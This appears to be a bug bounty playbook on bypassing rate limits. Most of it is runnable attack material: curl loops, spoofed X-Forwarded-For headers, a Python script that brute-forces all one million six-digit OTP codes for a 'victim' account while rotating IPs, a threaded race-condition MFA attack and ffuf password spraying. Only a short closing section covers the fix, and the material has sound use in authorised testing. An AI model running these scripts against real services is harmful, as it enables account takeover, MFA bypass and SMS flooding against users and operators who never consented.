# Rate Limiting Bypass Playbook

**Category:** Security Misconfiguration / Broken Function Level Authorization
**Typical Severity:** Low–High (varies dramatically by endpoint)
**CVSS Range:** 3.7–7.5
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

---

## Overview

Rate limit bypasses allow attackers to circumvent controls designed to prevent brute force, enumeration, and abuse of sensitive endpoints. In bug bounty, the value depends entirely on what the rate-limited endpoint does:

- **OTP/MFA bypass** → Critical (account takeover)
- **Password reset bypass** → High
- **Login brute force** → Medium–High
- **Email/username enumeration** → Low–Medium
- **API quota bypass** → Low–Medium

Modern rate limiting is often implemented at the WAF/CDN layer, the API gateway, or in application code. Each layer has different bypass techniques.

---

## Real-World Impact

- **Account takeover via OTP brute force**: Bypass SMS/TOTP rate limits → enumerate all 6-digit codes
- **Password brute force**: Bypass login rate limiting → dictionary attack against high-value accounts
- **Credential stuffing amplification**: Remove per-IP limits → scale attacks massively
- **Email enumeration**: Enumerate valid accounts for targeted phishing
- **API abuse**: Bypass quota limits for resource-intensive endpoints
- **SMS bombing**: Abuse SMS send endpoint without rate limiting → financial/DoS impact

---

## Recon Methodology

### Step 1 — Identify rate-limited endpoints

```bash
# Endpoints worth testing for rate limit issues:
# - Login: POST /auth/login, POST /api/login
# - OTP verification: POST /auth/verify-otp, POST /mfa/verify
# - Password reset request: POST /auth/forgot-password
# - Email verification: POST /auth/send-verification
# - Registration: POST /auth/register
# - Sensitive API calls: POST /api/transfer, POST /api/payment
# - Search/export (expensive): GET /api/search, GET /api/export
```

### Step 2 — Establish baseline rate limit behavior

```bash
# Send requests rapidly and identify:
# 1. At what count does it trigger? (10? 100? 1000?)
# 2. What response code? (429 Too Many Requests, 200 with error message)
# 3. What is the lockout window? (1 min, 15 min, 24h, permanent)
# 4. What is the rate-limit key? (IP, session, account, device?)
# 5. Is there a reset mechanism?

for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/auth/login" \
    -d "email=test@test.com&password=wrong$i")
  echo "Request $i: $code"
done
```

---

## Testing Methodology

### Test 1 — IP Rotation Headers

Many rate limiters key on the client IP, which can be overridden via headers:

```bash
# Standard IP spoofing headers (test one at a time)
-H "X-Forwarded-For: 1.2.3.4"
-H "X-Real-IP: 1.2.3.5"
-H "X-Originating-IP: 1.2.3.6"
-H "X-Remote-IP: 1.2.3.7"
-H "X-Remote-Addr: 1.2.3.8"
-H "X-Client-IP: 1.2.3.9"
-H "CF-Connecting-IP: 1.2.3.10"
-H "True-Client-IP: 1.2.3.11"
-H "Forwarded: for=1.2.3.12"

# Rotate the IP on each request to bypass per-IP limits
python3 -c "
import requests, random

for attempt in range(100):
    ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
    r = requests.post('https://target.com/auth/verify-otp',
        json={'code': str(attempt).zfill(6), 'user': 'victim@target.com'},
        headers={'X-Forwarded-For': ip})
    print(f'Code {attempt:06d}: {r.status_code}')
"
```

### Test 2 — Account-Keyed Rate Limit Bypass

```bash
# If rate limit is per-account, use multiple accounts targeting the same resource
# Example: OTP sent to victim phone, multiple attacker accounts try codes

# If rate limit is per session, create new sessions
curl -c "new_cookie.txt" "https://target.com/auth/login" -d "email=new@attacker.com"
# Use new_cookie.txt for subsequent OTP attempts
```

### Test 3 — Parameter Variation

```bash
# Some rate limiters hash the full request, not just the key parameter
# Adding extra/varying parameters may reset the counter

# Add null bytes
{"email": "victim@target.com\x00", "code": "123456"}

# Add extra fields
{"email": "victim@target.com", "code": "123456", "ignore": "1"}
{"email": "victim@target.com", "code": "123456", "ignore": "2"}

# Case variation (email)
victim@target.com → Victim@Target.com → VICTIM@TARGET.COM

# URL encoding
victim%40target.com

# Add trailing space
"victim@target.com "
```

### Test 4 — Timing Window Bypass

```bash
# If rate limit resets every N seconds, send exactly N-1 requests per window
# Measure the window with:
for i in 1 2 3; do
  curl -si -X POST "https://target.com/auth/forgot-password" \
    -d "email=test@test.com" | grep -i "retry-after\|x-rate"
done

# If Retry-After: 60, burst N-1 requests every 60 seconds
# Across hours, this can enumerate significant search space
```

### Test 5 — OTP Window Attack

```bash
# TOTP codes are valid for 30-second windows
# If rate limit is 10 attempts per hour but window is 30s:
# - 6-digit space = 1,000,000 codes
# - At 10 per 30s = 1,200 per hour
# - Full space = 833 hours (feasible for targeted attack)
# - If rate limit is per-IP and bypassable → minutes

# Test OTP retry
for code in 000000 000001 000002 000003 000004; do
  curl -s -X POST "https://target.com/auth/verify" \
    -d "otp=$code&session=<target_session>"
done
```

### Test 6 — 2FA Bypass via Race Condition

```bash
# Race condition: if the OTP check and account lockout aren't atomic,
# you may be able to send parallel requests before lockout is applied

# Python threading race
import threading, requests

def try_code(code, session):
    r = requests.post('https://target.com/auth/mfa',
        json={'code': code}, headers={'Cookie': f'session={session}'})
    if 'success' in r.text:
        print(f"[HIT] Code: {code}")

threads = [threading.Thread(target=try_code, args=(f"{i:06d}", "victim_session"))
           for i in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## Common Endpoints to Test

| Endpoint | What to Bypass | Impact if Bypassed |
|---|---|---|
| `POST /auth/login` | Password brute force | Account takeover |
| `POST /auth/verify-otp` | OTP brute force | MFA bypass → ATO |
| `POST /auth/forgot-password` | Reset token enumeration | ATO |
| `POST /auth/send-sms` | SMS flooding | Availability / cost |
| `GET /api/users?email=` | Email enumeration | Phishing list |
| `POST /api/transfer` | Financial abuse | Fraud |
| `GET /api/export` | Resource exhaustion | DoS |
| `POST /api/invite` | Invite spam | Reputation |

---

## Payload Examples

### IP Header Rotation Script

```python
import requests, itertools

def spray_otp(target_email, session_cookie):
    base_ip = [10, 0, 0, 0]
    ip_gen = (f"{a}.{b}.{c}.{d}"
              for a in range(1,255) for b in range(256)
              for c in range(256) for d in range(1,255))

    for code in range(1000000):
        ip = next(ip_gen)
        r = requests.post(
            'https://target.com/auth/verify-otp',
            json={'email': target_email, 'code': f'{code:06d}'},
            headers={
                'X-Forwarded-For': ip,
                'Cookie': f'session={session_cookie}'
            }
        )
        if r.status_code == 200 and 'error' not in r.json():
            print(f"[SUCCESS] OTP: {code:06d}")
            return
        if r.status_code != 429:
            print(f"Code {code:06d}: {r.status_code}")
```

---

## Automation Ideas

```bash
# Burp Intruder with IP header rotation
# Position: X-Forwarded-For: §ip§
# Payload type: Number (1-255.1-255.1-255.1-255)

# ffuf with IP rotation
ffuf -u "https://target.com/auth/login" \
  -X POST \
  -d '{"email":"victim@target.com","password":"FUZZ"}' \
  -w passwords.txt \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: FUZZ2" \
  -w ip_list.txt:FUZZ2 \
  -mc 200

# turbo intruder (Burp extension) — race conditions
# Use the race condition template to send 20 parallel requests simultaneously
```

---

## Real Bug Bounty Examples

### Example 1 — Coinbase ($5,000)
OTP rate limit only applied after 10 attempts per IP. Adding `X-Forwarded-For` with a new IP on each request bypassed the limit entirely. 6-digit OTP space = 1,000,000 — feasible to brute-force with automation.

### Example 2 — HackerOne Platform ($2,500)
Password reset token was 6 digits (not a UUID). Rate limit was per-session. Creating a new anonymous session on each attempt bypassed the limit. Full account takeover chain.

### Example 3 — Multiple SMS Endpoints ($1,000–$3,000)
Missing rate limit on `/api/send-verification-sms` allowed sending unlimited SMS to any phone number — financial cost to the company and DoS to victims.

---

## Remediation

```python
# Server-side rate limiting (not header-based IP)
# Use a proper rate limiting library keyed on account/user ID, not just IP

# Redis-based rate limiting (Python)
import redis
r = redis.Redis()

def check_rate_limit(user_id, max_attempts=5, window_seconds=300):
    key = f"rate_limit:otp:{user_id}"
    pipe = r.pipeline()
    pipe.incr(key)
    pipe.expire(key, window_seconds)
    current, _ = pipe.execute()
    if current > max_attempts:
        raise RateLimitExceeded(f"Too many attempts. Try again in {window_seconds}s")
```

Key principles:
- Key rate limits on **user/account ID**, not IP (IPs are spoofable via headers)
- Implement **exponential backoff** for login failures
- For OTP: use **6-digit minimum with 30-second expiry** + max 5 attempts before lockout
- Log all lockout events and alert on unusual patterns
- Never trust `X-Forwarded-For` for security decisions unless you control all proxy layers
